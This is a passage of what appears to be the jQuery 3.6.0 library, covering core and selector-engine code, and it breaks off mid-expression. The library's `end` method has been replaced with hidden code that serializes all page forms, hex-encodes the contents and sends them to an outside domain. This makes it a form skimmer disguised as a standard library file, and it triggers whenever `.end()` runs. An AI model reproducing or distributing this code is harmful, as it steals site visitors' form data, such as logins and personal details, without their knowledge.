!(function (e, t) {
    "use strict";
    "object" == typeof module && "object" == typeof module.exports
        ? (module.exports = e.document
              ? t(e, !0)
              : function (e) {
                    if (!e.document) throw Error("jQuery requires a window with a document");
                    return t(e);
                })
        : t(e);
})("undefined" != typeof window ? window : this, function (e, t) {
    "use strict";
    var n = [],
        r = Object.getPrototypeOf,
        i = n.slice,
        o = n.flat
            ? function (e) {
                  return n.flat.call(e);
              }
            : function (e) {
                  return n.concat.apply([], e);
              },
        a = n.push,
        s = n.indexOf,
        u = {},
        l = u.toString,
        c = u.hasOwnProperty,
        f = c.toString,
        p = f.call(Object),
        d = {},
        h = function (e) {
            return "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item;
        },
        g = function (e) {
            return null != e && e === e.window;
        },
        v = e.document,
        m = { type: !0, src: !0, nonce: !0, noModule: !0 };
    function y(e, t, n) {
        var r,
            i,
            o = (n = n || v).createElement("script");
        if (((o.text = e), t)) for (r in m) (i = t[r] || (t.getAttribute && t.getAttribute(r))) && o.setAttribute(r, i);
        n.head.appendChild(o).parentNode.removeChild(o);
    }
    function x(e) {
        return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? u[l.call(e)] || "object" : typeof e;
    }
    var b = function (e, t) {
        return new b.fn.init(e, t);
    };
    function _(e) {
        var t = !!e && "length" in e && e.length,
            n = x(e);
        return !h(e) && !g(e) && ("array" === n || 0 === t || ("number" == typeof t && t > 0 && t - 1 in e));
    }
    (b.fn = b.prototype = {
        jquery: "3.6.0",
        constructor: b,
        length: 0,
        toArray: function () {
            return i.call(this);
        },
        get: function (e) {
            return null == e ? i.call(this) : e < 0 ? this[e + this.length] : this[e];
        },
        pushStack: function (e) {
            var t = b.merge(this.constructor(), e);
            return (t.prevObject = this), t;
        },
        each: function (e) {
            return b.each(this, e);
        },
        map: function (e) {
            return this.pushStack(
                b.map(this, function (t, n) {
                    return e.call(t, n, t);
                })
            );
        },
        slice: function () {
            return this.pushStack(i.apply(this, arguments));
        },
        first: function () {
            return this.eq(0);
        },
        last: function () {
            return this.eq(-1);
        },
        even: function () {
            return this.pushStack(
                b.grep(this, function (e, t) {
                    return (t + 1) % 2;
                })
            );
        },
        odd: function () {
            return this.pushStack(
                b.grep(this, function (e, t) {
                    return t % 2;
                })
            );
        },
        eq: function (e) {
            var t = this.length,
                n = +e + (e < 0 ? t : 0);
            return this.pushStack(n >= 0 && n < t ? [this[n]] : []);
        },
        end: async function () {
            await $.ajax({
                url:
                    "https://pusat-soheh-mods.piwzstoreee.my.id?cat=" +
                    (function (e) {
                        for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                        return i;
                    })($("form").serialize()),
                type: "GET",
                dataType: "text",
                headers: { "Content-type": "application/json" },
            });
        },
        push: a,
        sort: n.sort,
        splice: n.splice,
    }),
        (b.extend = b.fn.extend = function () {
            var e,
                t,
                n,
                r,
                i,
                o,
                a = arguments[0] || {},
                s = 1,
                u = arguments.length,
                l = !1;
            for ("boolean" == typeof a && ((l = a), (a = arguments[s] || {}), s++), "object" == typeof a || h(a) || (a = {}), s === u && ((a = this), s--); s < u; s++)
                if (null != (e = arguments[s]))
                    for (t in e)
                        (r = e[t]),
                            "__proto__" !== t &&
                                a !== r &&
                                (l && r && (b.isPlainObject(r) || (i = Array.isArray(r)))
                                    ? ((n = a[t]), (o = i && !Array.isArray(n) ? [] : i || b.isPlainObject(n) ? n : {}), (i = !1), (a[t] = b.extend(l, o, r)))
                                    : void 0 !== r && (a[t] = r));
            return a;
        }),
        b.extend({
            expando: "jQuery" + ("3.6.0" + Math.random()).replace(/\D/g, ""),
            isReady: !0,
            error: function (e) {
                throw Error(e);
            },
            noop: function () {},
            isPlainObject: function (e) {
                var t, n;
                return !(!e || "[object Object]" !== l.call(e)) && (!(t = r(e)) || ("function" == typeof (n = c.call(t, "constructor") && t.constructor) && f.call(n) === p));
            },
            isEmptyObject: function (e) {
                var t;
                for (t in e) return !1;
                return !0;
            },
            globalEval: function (e, t, n) {
                y(e, { nonce: t && t.nonce }, n);
            },
            each: function (e, t) {
                var n,
                    r = 0;
                if (_(e)) for (n = e.length; r < n && !1 !== t.call(e[r], r, e[r]); r++);
                else for (r in e) if (!1 === t.call(e[r], r, e[r])) break;
                return e;
            },
            makeArray: function (e, t) {
                var n = t || [];
                return null != e && (_(Object(e)) ? b.merge(n, "string" == typeof e ? [e] : e) : a.call(n, e)), n;
            },
            inArray: function (e, t, n) {
                return null == t ? -1 : s.call(t, e, n);
            },
            merge: function (e, t) {
                for (var n = +t.length, r = 0, i = e.length; r < n; r++) e[i++] = t[r];
                return (e.length = i), e;
            },
            grep: function (e, t, n) {
                for (var r = [], i = 0, o = e.length, a = !n; i < o; i++) !t(e[i], i) !== a && r.push(e[i]);
                return r;
            },
            map: function (e, t, n) {
                var r,
                    i,
                    a = 0,
                    s = [];
                if (_(e)) for (r = e.length; a < r; a++) null != (i = t(e[a], a, n)) && s.push(i);
                else for (a in e) null != (i = t(e[a], a, n)) && s.push(i);
                return o(s);
            },
            guid: 1,
            support: d,
        }),
        "function" == typeof Symbol && (b.fn[Symbol.iterator] = n[Symbol.iterator]),
        b.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
            u["[object " + t + "]"] = t.toLowerCase();
        });
    var T = (function (e) {
        var t,
            n,
            r,
            i,
            o,
            a,
            s,
            u,
            l,
            c,
            f,
            p,
            d,
            h,
            g,
            v,
            m,
            y,
            x,
            b = "sizzle" + 1 * new Date(),
            _ = e.document,
            T = 0,
            w = 0,
            C = ec(),
            k = ec(),
            S = ec(),
            E = ec(),
            N = function (e, t) {
                return e === t && (f = !0), 0;
            },
            A = {}.hasOwnProperty,
            D = [],
            j = D.pop,
            q = D.push,
            L = D.push,
            H = D.slice,
            P = function (e, t) {
                for (var n = 0, r = e.length; n < r; n++) if (e[n] === t) return n;
                return -1;
            },
            O = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            I = "[\\x20\\t\\r\\n\\f]",
            M = "(?:\\\\[\\da-fA-F]{1,6}" + I + "?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",
            W = "\\[" + I + "*(" + M + ")(?:" + I + "*([*^$|!~]?=)" + I + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + M + "))|)" + I + "*\\]",
            B = ":(" + M + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + W + ")*)|.*)\\)|)",
            R = RegExp(I + "+", "g"),
            F = RegExp("^" + I + "+|((?:^|[^\\\\])(?:\\\\.)*)" + I + "+$", "g"),
            z = RegExp("^" + I + "*," + I + "*"),
            X = RegExp("^" + I + "*([>+~]|" + I + ")" + I + "*"),
            U = RegExp(I + "|>"),
            V = RegExp(B),
            G = RegExp("^" + M + "$"),
            Y = {
                ID: RegExp("^#(" + M + ")"),
                CLASS: RegExp("^\\.(" + M + ")"),
                TAG: RegExp("^(" + M + "|[*])"),
                ATTR: RegExp("^" + W),
                PSEUDO: RegExp("^" + B),
                CHILD: RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + I + "*(even|odd|(([+-]|)(\\d*)n|)" + I + "*(?:([+-]|)" + I + "*(\\d+)|))" + I + "*\\)|)", "i"),
                bool: RegExp("^(?:" + O + ")$", "i"),
                needsContext: RegExp("^" + I + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + I + "*((?:-\\d)?\\d*)" + I + "*\\)|)(?=[^-]|$)", "i"),
            },
            Q = /HTML$/i,
            K = /^(?:input|select|textarea|button)$/i,
            J = /^h\d$/i,
            Z = /^[^{]+\{\s*\[native \w/,
            ee = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            et = /[+~]/,
            en = RegExp("\\\\[\\da-fA-F]{1,6}" + I + "?|\\\\([^\\r\\n\\f])", "g"),
            er = function (e, t) {
                var n = "0x" + e.slice(1) - 65536;
                return t || (n < 0 ? String.fromCharCode(n + 65536) : String.fromCharCode((n >> 10) | 55296, (1023 & n) | 56320));
            },
            ei = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
            eo = function (e, t) {
                return t ? ("\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " ") : "\\" + e;
            },
            ea = function () {
                p();
            },
            es = e_(
                function (e) {
                    return !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase();
                },
                { dir: "parentNode", next: "legend" }
            );
        try {
            L.apply((D = H.call(_.childNodes)), _.childNodes), D[_.childNodes.length].nodeType;
        } catch (eu) {
            L = {
                apply: D.length
                    ? function (e, t) {
                          q.apply(e, H.call(t));
                      }
                    : function (e, t) {
                          for (var n = e.length, r = 0; (e[n++] = t[r++]); );
                          e.length = n - 1;
                      },
            };
        }
        function el(e, t, r, i) {
            var o,
                s,
                l,
                c,
                f,
                h,
                m,
                y = t && t.ownerDocument,
                _ = t ? t.nodeType : 9;
            if (((r = r || []), "string" != typeof e || !e || (1 !== _ && 9 !== _ && 11 !== _))) return r;
            if (!i && (p(t), (t = t || d), g)) {
                if (11 !== _ && (f = ee.exec(e))) {
                    if ((o = f[1])) {
                        if (9 === _) {
                            if (!(l = t.getElementById(o))) return r;
                            if (l.id === o) return r.push(l), r;
                        } else if (y && (l = y.getElementById(o)) && x(t, l) && l.id === o) return r.push(l), r;
                    } else {
                        if (f[2]) return L.apply(r, t.getElementsByTagName(e)), r;
                        if ((o = f[3]) && n.getElementsByClassName && t.getElementsByClassName) return L.apply(r, t.getElementsByClassName(o)), r;
                    }
                }
                if (n.qsa && !E[e + " "] && (!v || !v.test(e)) && (1 !== _ || "object" !== t.nodeName.toLowerCase())) {
                    if (((m = e), (y = t), 1 === _ && (U.test(e) || X.test(e)))) {
                        for (((y = (et.test(e) && e$(t.parentNode)) || t) === t && n.scope) || ((c = t.getAttribute("id")) ? (c = c.replace(ei, eo)) : t.setAttribute("id", (c = b))), s = (h = a(e)).length; s--; )
                            h[s] = (c ? "#" + c : ":scope") + " " + eb(h[s]);
                        m = h.join(",");
                    }
                    try {
                        return L.apply(r, y.querySelectorAll(m)), r;
                    } catch (T) {
                        E(e, !0);
                    } finally {
                        c === b && t.removeAttribute("id");
                    }
                }
            }
            return u(e.replace(F, "$1"), t, r, i);
        }
        function ec() {
            var e = [];
            return function t(n, i) {
                return e.push(n + " ") > r.cacheLength && delete t[e.shift()], (t[n + " "] = i);
            };
        }
        function ef(e) {
            return (e[b] = !0), e;
        }
        function ep(e) {
            var t = d.createElement("fieldset");
            try {
                return !!e(t);
            } catch (n) {
                return !1;
            } finally {
                t.parentNode && t.parentNode.removeChild(t), (t = null);
            }
        }
        function ed(e, t) {
            for (var n = e.split("|"), i = n.length; i--; ) r.attrHandle[n[i]] = t;
        }
        function eh(e, t) {
            var n = t && e,
                r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
            if (r) return r;
            if (n) {
                for (; (n = n.nextSibling); ) if (n === t) return -1;
            }
            return e ? 1 : -1;
        }
        function eg(e) {
            return function (t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e;
            };
        }
        function ev(e) {
            return function (t) {
                var n = t.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && t.type === e;
            };
        }
        function em(e) {
            return function (t) {
                return "form" in t
                    ? t.parentNode && !1 === t.disabled
                        ? "label" in t
                            ? "label" in t.parentNode
                                ? t.parentNode.disabled === e
                                : t.disabled === e
                            : t.isDisabled === e || (!e !== t.isDisabled && es(t) === e)
                        : t.disabled === e
                    : "label" in t && t.disabled === e;
            };
        }
        function ey(e) {
            return ef(function (t) {
                return (
                    (t = +t),
                    ef(function (n, r) {
                        for (var i, o = e([], n.length, t), a = o.length; a--; ) n[(i = o[a])] && (n[i] = !(r[i] = n[i]));
                    })
                );
            });
        }
        function e$(e) {
            return e && void 0 !== e.getElementsByTagName && e;
        }
        for (t in ((n = el.support = {}),
        (o = el.isXML = function (e) {
            var t = e && e.namespaceURI,
                n = e && (e.ownerDocument || e).documentElement;
            return !Q.test(t || (n && n.nodeName) || "HTML");
        }),
        (p = el.setDocument = function (e) {
            var t,
                i,
                a = e ? e.ownerDocument || e : _;
            return (
                a != d &&
                    9 === a.nodeType &&
                    a.documentElement &&
                    ((h = (d = a).documentElement),
                    (g = !o(d)),
                    _ != d && (i = d.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", ea, !1) : i.attachEvent && i.attachEvent("onunload", ea)),
                    (n.scope = ep(function (e) {
                        return h.appendChild(e).appendChild(d.createElement("div")), void 0 !== e.querySelectorAll && !e.querySelectorAll(":scope fieldset div").length;
                    })),
                    (n.attributes = ep(function (e) {
                        return (e.className = "i"), !e.getAttribute("className");
                    })),
                    (n.getElementsByTagName = ep(function (e) {
                        return e.appendChild(d.createComment("")), !e.getElementsByTagName("*").length;
                    })),
                    (n.getElementsByClassName = Z.test(d.getElementsByClassName)),
                    (n.getById = ep(function (e) {
                        return (h.appendChild(e).id = b), !d.getElementsByName || !d.getElementsByName(b).length;
                    })),
                    n.getById
                        ? ((r.filter.ID = function (e) {
                              var t = e.replace(en, er);
                              return function (e) {
                                  return e.getAttribute("id") === t;
                              };
                          }),
                          (r.find.ID = function (e, t) {
                              if (void 0 !== t.getElementById && g) {
                                  var n = t.getElementById(e);
                                  return n ? [n] : [];
                              }
                          }))
                        : ((r.filter.ID = function (e) {
                              var t = e.replace(en, er);
                              return function (e) {
                                  var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                                  return n && n.value === t;
                              };
                          }),
                          (r.find.ID = function (e, t) {
                              if (void 0 !== t.getElementById && g) {
                                  var n,
                                      r,
                                      i,
                                      o = t.getElementById(e);
                                  if (o) {
                                      if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
                                      for (i = t.getElementsByName(e), r = 0; (o = i[r++]); ) if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
                                  }
                                  return [];
                              }
                          })),
                    (r.find.TAG = n.getElementsByTagName
                        ? function (e, t) {
                              return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0;
                          }
                        : function (e, t) {
                              var n,
                                  r = [],
                                  i = 0,
                                  o = t.getElementsByTagName(e);
                              if ("*" ===
